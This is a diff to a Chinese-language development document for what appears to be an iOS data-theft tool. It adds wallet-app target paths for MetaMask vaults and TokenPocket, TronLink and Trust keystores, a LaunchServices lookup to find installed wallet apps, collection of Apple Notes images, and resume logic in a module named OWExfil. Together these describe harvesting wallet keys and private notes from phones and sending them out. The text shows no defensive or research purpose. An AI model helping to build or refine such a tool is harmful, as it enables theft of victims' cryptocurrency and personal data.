@@ -140,7 +140,7 @@ NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
 | TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令 |
 | TronLink | `io.tronlink.wallet` 等 | `Documents/TronLinkData.sqlite`、`keystore` | 地址、keystore |
 | Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址 |
-| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址 |
+| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据） |
 | OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore |
 | Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库 |
 | Ledger Live | `com.ledger.live`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户、地址（无私钥） |
@@ -567,6 +567,8 @@ B: TokenPocket 完成（0.1s）
 | **单遍目录** | `OWContainerPass._collectAndIndex:` | 一次 enumerator 同时做定义件拷贝、兜底候选收集、`_file_index.json`；缓存/日志/媒体目录 `skipDescendants` |
 | **遍历不逐项 stat** | `OWContainerPass._collectAndIndex:` | MHA sandbox extension 下每次 stat ≈4.8ms，改为只在「要拷贝/入候选」时 stat；索引只记路径。实测 OKX 24s → 亚秒级 |
 | **边车不重复拷** | `OWContainerPass` 定义文件分支 | 定义件里同时列了 `-wal/-shm` 时，交给边车自己那轮拷，主库不再重复带一遍 |
+| **Discovery 反查** | `OWContainerPass.run` + `OWLaunchServices` | 目标变体全查不到时，用 LaunchServices 的已安装列表按名字模糊反查（如 TronLink）；日志同时打印「钱包类候选 bundleId」便于校准 |
+| **备忘录图片** | `targets.plist` AppleNotes `includeMedia` + `Media` 路径 | 图片/附件不再被 heavy 规则跳过，也不受 2MB 宽松上限限制（受单目标 150MB 总量约束） |
 | `hasPendingData` 含 manifest | `OWExfil.hasPendingData` | 只剩 manifest 没传也会续跑，不再残留到下一轮 |
 
 ### 14.2 部分实现 / 未实现 ⚠️❌
